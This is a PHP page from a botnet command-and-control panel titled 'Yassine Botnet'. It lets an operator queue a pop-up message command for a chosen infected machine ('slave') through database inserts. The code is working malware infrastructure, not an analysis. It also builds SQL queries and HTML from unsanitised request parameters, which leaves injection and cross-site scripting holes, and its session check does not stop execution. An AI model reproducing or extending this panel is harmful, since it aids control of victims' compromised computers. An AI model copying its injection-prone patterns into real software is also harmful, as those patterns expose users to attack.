<?
session_start();
include("../../includes/configuration.inc.php");
include("../../includes/mysql_connect.inc.php");
if($_SESSION['botnet_session'] != $security_token) 
{
echo "<script>window.location='../../index.php';</script>";
}
?>
<html>
<head>
<title>Yassine Botnet</title>
<link rel="stylesheet" type="text/css" href="../../style/plugins.css">
<link rel="stylesheet" type="text/css" href="../style/main.css">
<link rel="stylesheet" type="text/css" href="style/cmd.css">
<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Lobster">
<?
if(file_exists("../../yassin.php")) 
{
$checker = fopen("../../yassin.php","r");
$copyrights = fgets($checker);
if ($copyrights != "Yassin Taktak") 
{
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
}else {
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
?>
</head>
<body><center>
<br><br><br><br><br><br><br>
<font size="30" color="#009999" face="Lobster">SHOW MESSAGE BOX</font>
<form action="" method="post">
<br>
<input type="text" class="inputbox" placeholder="MESSAGE CONTENT" name="msgcontent">
<br><br>
<input type="text" class="inputbox" placeholder="MESSAGE TITLE" name="msgtitle">
<br><br>
<input type="text" class="inputbox" value="<? echo $_GET['slave'] ?>" name="slave" disabled>
<br><br>
<input type="submit" class="submitbox" value="SHOW MESSAGE BOX" name="submit">
</form>
</center>
</body>
</html>
<?php
if(isset($_POST['submit']))
{
$slave_id = $_GET['slave'];
$target = $_POST['msgcontent'];
$msgtitle = $_POST['msgtitle'];
$fullcommand = "$target|$msgtitle";
$update_query = "UPDATE slaves SET command='msgbox' WHERE id='$slave_id'";
mysql_query($update_query, $connect);
$add_command = "INSERT INTO  commands (slave_id, command, status, content)
VALUES ('$slave_id', 'msgbox', 'pending', '$fullcommand')";
mysql_query($add_command, $connect);
echo "<script>window.location='../show_slaves.php';</script>";
}
?>